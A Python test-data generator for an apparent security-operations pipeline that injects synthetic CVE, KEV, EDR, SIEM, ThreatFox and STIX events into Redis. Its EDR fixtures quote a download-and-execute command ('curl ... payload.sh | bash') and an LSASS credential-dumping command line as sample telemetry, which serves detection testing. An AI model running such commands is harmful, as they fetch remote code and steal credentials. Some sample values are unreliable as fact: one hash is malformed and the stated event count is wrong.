#!/usr/bin/env python3
"""
AEGIS Synthetic Data Generator

Injects realistic test events into the Redis inbound stream to exercise
the full pipeline: Orchestrator → Triage → Simulation → Detection → Advisory.

Covers all six source types, all four priority levels, and a mix of:
  - Real-world CVEs with accurate CVSS payloads
  - CISA KEV entries for critical active-exploitation scenarios
  - EDR endpoint alerts with process telemetry
  - SIEM correlation rule hits
  - ThreatFox IOC payloads
  - STIX 2.1 indicator bundles

Usage:
    # Inject all 20 events at once (burst mode)
    python scripts/generate_synthetic.py

    # Inject events with a delay between each (stream mode, default 3s)
    python scripts/generate_synthetic.py --stream

    # Custom delay
    python scripts/generate_synthetic.py --stream --delay 5

    # Inject a specific count (random selection)
    python scripts/generate_synthetic.py --count 5

    # Target a specific Redis URL
    python scripts/generate_synthetic.py --redis redis://redis:6379

Environment:
    REDIS_URL   override Redis connection (default: redis://localhost:6379)
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

import redis

# ── Constants ─────────────────────────────────────────────────────────────────

INBOUND_STREAM = "aegis:events:inbound"

# ── Helpers ───────────────────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _recent(hours_ago: int = 0, days_ago: int = 0) -> str:
    dt = datetime.now(timezone.utc) - timedelta(hours=hours_ago, days=days_ago)
    return dt.isoformat()


def _event(
    source_type: str,
    raw_payload: dict[str, Any],
    priority: str | None = None,
    routing_target: str | None = None,
    ttl: int = 86400,
) -> dict[str, str]:
    """Build a flat Redis stream entry matching AEGISEvent.to_redis_stream()."""
    fields: dict[str, str] = {
        "event_id": str(uuid.uuid4()),
        "source_type": source_type,
        "raw_payload": json.dumps(raw_payload, separators=(",", ":")),
        "ingested_at": _now(),
        "ttl": str(ttl),
    }
    if priority:
        fields["priority"] = priority
    if routing_target:
        fields["routing_target"] = routing_target
    return fields


# ── NVD CVE events (source_type: nvd) ────────────────────────────────────────
# Realistic NVD API v2 payload structure with CVSS metrics

NVD_EVENTS = [
    # P0 — Critical: PAN-OS RCE (CVSS 10.0)
    _event("nvd", {
        "cve_id": "CVE-2024-3400",
        "published": _recent(hours_ago=2),
        "lastModified": _recent(hours_ago=1),
        "vulnStatus": "Analyzed",
        "descriptions": [{"lang": "en", "value": "PAN-OS GlobalProtect gateway command injection vulnerability allowing unauthenticated remote code execution via crafted HTTP requests. Actively exploited in the wild."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "baseScore": 10.0, "baseSeverity": "CRITICAL"}}],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": "CWE-77"}]}],
        "references": [{"url": "https://security.paloaltonetworks.com/CVE-2024-3400", "source": "vendor"}],
        "configurations": [],
    }, priority="P0", routing_target="triage"),

    # P0 — Critical: Log4Shell (CVSS 10.0)
    _event("nvd", {
        "cve_id": "CVE-2021-44228",
        "published": _recent(days_ago=1),
        "lastModified": _recent(hours_ago=6),
        "vulnStatus": "Analyzed",
        "descriptions": [{"lang": "en", "value": "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints. Log4j2 allows lookups to be included in log messages which can lead to remote code execution."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "baseScore": 10.0, "baseSeverity": "CRITICAL"}}],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": "CWE-502"}]}],
        "references": [{"url": "https://logging.apache.org/log4j/2.x/security.html", "source": "vendor"}],
        "configurations": [],
    }, priority="P0", routing_target="triage"),

    # P1 — High: Citrix Bleed (CVSS 9.4)
    _event("nvd", {
        "cve_id": "CVE-2023-4966",
        "published": _recent(days_ago=3),
        "lastModified": _recent(hours_ago=12),
        "vulnStatus": "Analyzed",
        "descriptions": [{"lang": "en", "value": "Citrix NetScaler ADC and NetScaler Gateway sensitive information disclosure vulnerability. Allows session token leakage enabling session hijack without credentials."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "baseScore": 9.4, "baseSeverity": "CRITICAL"}}],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": "CWE-119"}]}],
        "references": [{"url": "https://support.citrix.com/article/CTX579459", "source": "vendor"}],
        "configurations": [],
    }, priority="P1", routing_target="triage"),

    # P1 — High: FortiOS RCE (CVSS 9.8)
    _event("nvd", {
        "cve_id": "CVE-2024-21762",
        "published": _recent(days_ago=2),
        "lastModified": _recent(hours_ago=3),
        "vulnStatus": "Analyzed",
        "descriptions": [{"lang": "en", "value": "Fortinet FortiOS out-of-bounds write vulnerability in SSL-VPN daemon allows unauthenticated remote code execution via specially crafted HTTP requests."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "baseScore": 9.8, "baseSeverity": "CRITICAL"}}],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": "CWE-787"}]}],
        "references": [{"url": "https://fortiguard.com/psirt/FG-IR-24-015", "source": "vendor"}],
        "configurations": [],
    }, priority="P1", routing_target="triage"),

    # P2 — Medium: HTTP/2 Rapid Reset (CVSS 7.5)
    _event("nvd", {
        "cve_id": "CVE-2023-44487",
        "published": _recent(days_ago=10),
        "lastModified": _recent(days_ago=5),
        "vulnStatus": "Analyzed",
        "descriptions": [{"lang": "en", "value": "The HTTP/2 protocol allows a denial of service via rapid stream cancellation (Rapid Reset attack). Affects nginx, Apache httpd, IIS, and many HTTP/2 implementations."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "baseScore": 7.5, "baseSeverity": "HIGH"}}],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": "CWE-400"}]}],
        "references": [],
        "configurations": [],
    }, priority="P2", routing_target="triage"),

    # P3 — Low: Chrome V8 OOB (CVSS 3.5, older)
    _event("nvd", {
        "cve_id": "CVE-2024-0519",
        "published": _recent(days_ago=30),
        "lastModified": _recent(days_ago=20),
        "vulnStatus": "Modified",
        "descriptions": [{"lang": "en", "value": "Out-of-bounds memory access in V8 in Google Chrome prior to 120.0.6099.224 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}],
        "metrics": {
            "cvssMetricV31": [{"type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N", "baseScore": 3.1, "baseSeverity": "LOW"}}],
        },
        "weaknesses": [],
        "references": [],
        "configurations": [],
    }, priority="P3", routing_target="triage"),
]


# ── CISA KEV events (source_type: cisa_kev) ──────────────────────────────────
# P0 by definition — known-exploited vulnerabilities

CISA_EVENTS = [
    _event("cisa_kev", {
        "cve_id": "CVE-2024-3400",
        "vendor_project": "Palo Alto Networks",
        "product": "PAN-OS",
        "vulnerability_name": "Palo Alto Networks PAN-OS Command Injection Vulnerability",
        "date_added": _recent(hours_ago=4),
        "short_description": "Palo Alto Networks PAN-OS GlobalProtect feature contains a command injection vulnerability that allows unauthenticated attackers to execute arbitrary OS commands with root privileges.",
        "required_action": "Apply mitigations per vendor instructions or discontinue use of the product if mitigations are unavailable.",
        "due_date": _recent(days_ago=-14),  # 14 days from now
        "known_ransomware_campaign_use": "Known",
    }),

    _event("cisa_kev", {
        "cve_id": "CVE-2024-21762",
        "vendor_project": "Fortinet",
        "product": "FortiOS",
        "vulnerability_name": "Fortinet FortiOS Out-of-Bound Write Vulnerability",
        "date_added": _recent(hours_ago=8),
        "short_description": "Fortinet FortiOS contains an out-of-bounds write vulnerability in the SSL-VPN daemon that allows an unauthenticated attacker to achieve remote code execution.",
        "required_action": "Apply vendor updates. If unable to patch, disable SSL VPN as interim mitigation.",
        "due_date": _recent(days_ago=-7),
        "known_ransomware_campaign_use": "Unknown",
    }),

    _event("cisa_kev", {
        "cve_id": "CVE-2023-46805",
        "vendor_project": "Ivanti",
        "product": "Connect Secure",
        "vulnerability_name": "Ivanti Connect Secure Authentication Bypass Vulnerability",
        "date_added": _recent(days_ago=1),
        "short_description": "Ivanti Connect Secure and Policy Secure contain an authentication bypass vulnerability in the web component that allows an attacker to access restricted resources.",
        "required_action": "Apply vendor mitigation XML or patch. Perform integrity checking using Ivanti's ICT tool.",
        "due_date": _recent(days_ago=-21),
        "known_ransomware_campaign_use": "Known",
    }),
]


# ── EDR events (source_type: edr) ────────────────────────────────────────────
# P0 — live endpoint telemetry requiring immediate detection correlation

EDR_EVENTS = [
    _event("edr", {
        "alert_id": f"EDR-{random.randint(100000, 999999)}",
        "hostname": "ws-exec-001",
        "asset_id": "AS-012",
        "ip": "10.10.5.101",
        "os": "Windows 11",
        "severity": "critical",
        "alert_type": "credential_access",
        "title": "LSASS Memory Access Detected",
        "description": "Suspicious process accessed LSASS memory using OpenProcess with PROCESS_VM_READ. Consistent with Mimikatz or similar credential dumping tool. Process: rundll32.exe (PID 4892) accessing lsass.exe (PID 764).",
        "mitre_technique": "T1003.001",
        "process": {"name": "rundll32.exe", "pid": 4892, "ppid": 3104, "user": "CORP\\admin.jdoe", "cmdline": "rundll32.exe C:\\Windows\\Temp\\tmp4829.dll,DumpCreds"},
        "target_process": {"name": "lsass.exe", "pid": 764},
        "timestamp": _now(),
        "agent_version": "7.2.1",
    }),

    _event("edr", {
        "alert_id": f"EDR-{random.randint(100000, 999999)}",
        "hostname": "web-prod-01",
        "asset_id": "AS-001",
        "ip": "10.10.1.11",
        "os": "Ubuntu 22.04",
        "severity": "high",
        "alert_type": "execution",
        "title": "Suspicious Shell Spawned by Web Server",
        "description": "nginx worker process spawned /bin/bash with network connectivity. Possible web shell or RCE exploitation. Child process established outbound connection to 45.77.65.211:443.",
        "mitre_technique": "T1059.004",
        "process": {"name": "bash", "pid": 28412, "ppid": 1847, "user": "www-data", "cmdline": "/bin/bash -c 'curl http://45.77.65.211/payload.sh | bash'"},
        "parent_process": {"name": "nginx", "pid": 1847},
        "network": {"dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "tcp"},
        "timestamp": _now(),
        "agent_version": "7.2.1",
    }),
]


# ── SIEM events (source_type: siem) ──────────────────────────────────────────
# P1 — SIEM correlation rule hits

SIEM_EVENTS = [
    _event("siem", {
        "rule_id": "SIEM-BRUTE-001",
        "rule_name": "Brute Force Authentication — Domain Controller",
        "severity": "high",
        "event_count": 847,
        "time_window_minutes": 15,
        "source_ips": ["10.10.5.101", "10.10.5.142", "10.10.5.107"],
        "target": {"hostname": "dc-primary", "ip": "10.10.3.10", "asset_id": "AS-007"},
        "mitre_technique": "T1078",
        "description": "847 failed NTLM authentication attempts detected against DC dc-primary from 3 internal workstations in a 15-minute window. Possible credential stuffing or brute-force attack using compromised workstation accounts.",
        "correlated_events": [
            {"type": "windows_security", "event_id": "4625", "count": 847},
            {"type": "windows_security", "event_id": "4624", "count": 3, "note": "3 successful logins after failures"},
        ],
        "timestamp": _now(),
    }),

    _event("siem", {
        "rule_id": "SIEM-LATMOV-002",
        "rule_name": "Lateral Movement — SMB Admin Share Access",
        "severity": "high",
        "event_count": 12,
        "time_window_minutes": 5,
        "source_ip": "10.10.5.101",
        "targets": [
            {"hostname": "db-primary-01", "ip": "10.10.2.11", "asset_id": "AS-004"},
            {"hostname": "db-replica-01", "ip": "10.10.2.12", "asset_id": "AS-005"},
            {"hostname": "ci-runner-01", "ip": "10.10.6.10", "asset_id": "AS-015"},
        ],
        "mitre_technique": "T1021.002",
        "description": "Host ws-exec-001 accessed ADMIN$ and C$ shares on 3 servers within 5 minutes using service account credentials. Consistent with pass-the-hash lateral movement pattern.",
        "correlated_events": [
            {"type": "windows_security", "event_id": "5140", "count": 12, "note": "Network share access"},
            {"type": "windows_security", "event_id": "4648", "count": 3, "note": "Explicit credential logon"},
        ],
        "timestamp": _now(),
    }),
]


# ── ThreatFox IOC events (source_type: threatfox) ────────────────────────────
# P1 — active IOC/malware intel

THREATFOX_EVENTS = [
    _event("threatfox", {
        "ioc_id": 1248923,
        "ioc_type": "ip:port",
        "ioc_value": "45.77.65.211:443",
        "threat_type": "botnet_cc",
        "malware": "CobaltStrike",
        "malware_alias": "Cobalt Strike Beacon",
        "confidence_level": 90,
        "first_seen": _recent(days_ago=5),
        "last_seen": _recent(hours_ago=1),
        "reporter": "abuse_ch",
        "tags": ["cobalt-strike", "c2", "APT29"],
        "reference": "https://bazaar.abuse.ch/sample/abc123...",
    }),

    _event("threatfox", {
        "ioc_id": 1250147,
        "ioc_type": "domain",
        "ioc_value": "update-service-cdn.com",
        "threat_type": "botnet_cc",
        "malware": "BlackCat",
        "malware_alias": "ALPHV Ransomware",
        "confidence_level": 95,
        "first_seen": _recent(days_ago=2),
        "last_seen": _recent(hours_ago=3),
        "reporter": "abuse_ch",
        "tags": ["alphv", "ransomware", "blackcat", "c2"],
        "reference": "https://bazaar.abuse.ch/sample/def456...",
    }),
]


# ── STIX 2.1 events (source_type: stix) ──────────────────────────────────────
# P3 — structured threat intel for adversary simulation

STIX_EVENTS = [
    _event("stix", {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "spec_version": "2.1",
        "objects": [
            {
                "type": "indicator",
                "id": f"indicator--{uuid.uuid4()}",
                "created": _recent(days_ago=1),
                "modified": _recent(hours_ago=2),
                "name": "Volt Typhoon Living-off-the-Land C2 Pattern",
                "description": "Network traffic pattern associated with Volt Typhoon using legitimate admin tools (ntdsutil, netsh, PowerShell) for command-and-control over existing remote management channels.",
                "pattern": "[network-traffic:dst_ref.type = 'ipv4-addr' AND network-traffic:dst_port IN (443, 5985, 5986)]",
                "pattern_type": "stix",
                "valid_from": _recent(days_ago=30),
                "labels": ["malicious-activity", "apt"],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "command-and-control"},
                    {"kill_chain_name": "mitre-attack", "phase_name": "lateral-movement"},
                ],
            },
            {
                "type": "attack-pattern",
                "id": f"attack-pattern--{uuid.uuid4()}",
                "created": _recent(days_ago=1),
                "name": "Exploit Public-Facing Application",
                "external_references": [{"source_name": "mitre-attack", "external_id": "T1190"}],
            },
            {
                "type": "threat-actor",
                "id": f"threat-actor--{uuid.uuid4()}",
                "created": _recent(days_ago=1),
                "name": "Volt Typhoon",
                "aliases": ["BRONZE SILHOUETTE", "Dev-0391"],
                "threat_actor_types": ["nation-state"],
                "primary_motivation": "organizational-gain",
            },
        ],
    }),

    _event("stix", {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "spec_version": "2.1",
        "objects": [
            {
                "type": "indicator",
                "id": f"indicator--{uuid.uuid4()}",
                "created": _recent(hours_ago=6),
                "modified": _recent(hours_ago=1),
                "name": "LockBit 3.0 Ransomware Deployment Indicator",
                "description": "File hash and behavioral pattern associated with LockBit 3.0 ransomware deployment. Typically follows initial access via exposed RDP or VPN exploit, privilege escalation, and credential dumping.",
                "pattern": "[file:hashes.'SHA-256' = 'a]b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3'",
                "pattern_type": "stix",
                "valid_from": _recent(days_ago=7),
                "labels": ["malicious-activity", "ransomware"],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "impact"},
                ],
            },
            {
                "type": "malware",
                "id": f"malware--{uuid.uuid4()}",
                "created": _recent(days_ago=7),
                "name": "LockBit 3.0",
                "malware_types": ["ransomware"],
                "is_family": True,
            },
        ],
    }),

    _event("stix", {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "spec_version": "2.1",
        "objects": [
            {
                "type": "indicator",
                "id": f"indicator--{uuid.uuid4()}",
                "created": _recent(hours_ago=12),
                "modified": _recent(hours_ago=2),
                "name": "Lazarus Group Cryptocurrency Heist Supply Chain Pattern",
                "description": "Behavioral pattern of Lazarus Group supply chain compromise targeting cryptocurrency exchanges. Uses trojanized NPM packages to establish initial access followed by credential theft and fund exfiltration.",
                "pattern": "[process:command_line LIKE '%npm install%' AND network-traffic:dst_ref.value = '185.29.8.%']",
                "pattern_type": "stix",
                "valid_from": _recent(days_ago=14),
                "labels": ["malicious-activity", "apt"],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "initial-access"},
                    {"kill_chain_name": "mitre-attack", "phase_name": "collection"},
                ],
            },
            {
                "type": "threat-actor",
                "id": f"threat-actor--{uuid.uuid4()}",
                "created": _recent(days_ago=14),
                "name": "Lazarus Group",
                "aliases": ["HIDDEN COBRA", "Zinc", "APT38"],
                "threat_actor_types": ["nation-state"],
                "primary_motivation": "personal-gain",
            },
        ],
    }),
]


# ── Aggregate all events ──────────────────────────────────────────────────────

ALL_EVENTS: list[dict[str, str]] = (
    NVD_EVENTS
    + CISA_EVENTS
    + EDR_EVENTS
    + SIEM_EVENTS
    + THREATFOX_EVENTS
    + STIX_EVENTS
)


# ── Injection ─────────────────────────────────────────────────────────────────

def inject(
    redis_url: str,
    events: list[dict[str, str]],
    stream_mode: bool = False,
    delay: float = 3.0,
) -> None:
    r = redis.from_url(redis_url, decode_responses=True)

    try:
        r.ping()
    except redis.ConnectionError:
        print(f"ERROR: Cannot connect to Redis at {redis_url}")
        sys.exit(1)

    print(f"Connected to Redis at {redis_url}")
    print(f"Injecting {len(events)} events into {INBOUND_STREAM}")
    if stream_mode:
        print(f"Stream mode: {delay}s delay between events\n")
    else:
        print("Burst mode: all events at once\n")

    for i, event in enumerate(events, 1):
        source = event["source_type"]
        payload = json.loads(event["raw_payload"])

        # Extract a human-readable label
        label = (
            payload.get("cve_id")
            or payload.get("vulnerability_name", "")[:40]
            or payload.get("title", "")[:40]
            or payload.get("rule_name", "")[:40]
            or payload.get("ioc_value", "")
            or payload.get("objects", [{}])[0].get("name", "")[:40]
            or "unknown"
        )

        priority = event.get("priority", "—")

        stream_id = r.xadd(
            INBOUND_STREAM,
            event,
            maxlen=50_000,
        )

        print(
            f"  [{i:>2}/{len(events)}]  {source:<12}  {priority:<4}  "
            f"{label:<45}  → {stream_id}"
        )

        if stream_mode and i < len(events):
            time.sleep(delay)

    print(f"\nDone. {len(events)} events injected into {INBOUND_STREAM}.")

    # Show stream length
    length = r.xlen(INBOUND_STREAM)
    print(f"Stream length: {length}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="AEGIS Synthetic Data Generator — inject test events into Redis",
    )
    parser.add_argument(
        "--redis",
        default=None,
        help="Redis URL (default: $REDIS_URL or redis://localhost:6379)",
    )
    parser.add_argument(
        "--stream",
        action="store_true",
        help="Stream mode: inject events with a delay between each",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=3.0,
        help="Delay between events in stream mode (seconds, default: 3)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=0,
        help="Number of events to inject (0 = all, default: all)",
    )
    parser.add_argument(
        "--shuffle",
        action="store_true",
        help="Randomize event order",
    )
    args = parser.parse_args()

    import os
    redis_url = args.redis or os.getenv("REDIS_URL", "redis://localhost:6379")

    events = list(ALL_EVENTS)

    if args.shuffle:
        random.shuffle(events)

    if args.count > 0:
        events = events[:args.count]

    print("=" * 72)
    print("  AEGIS Synthetic Data Generator")
    print("=" * 72)

    # Summary by source type
    by_source: dict[str, int] = {}
    for e in events:
        by_source[e["source_type"]] = by_source.get(e["source_type"], 0) + 1
    for src, count in sorted(by_source.items()):
        print(f"  {src:<12}  {count} events")
    print()

    inject(redis_url, events, stream_mode=args.stream, delay=args.delay)


if __name__ == "__main__":
    main()
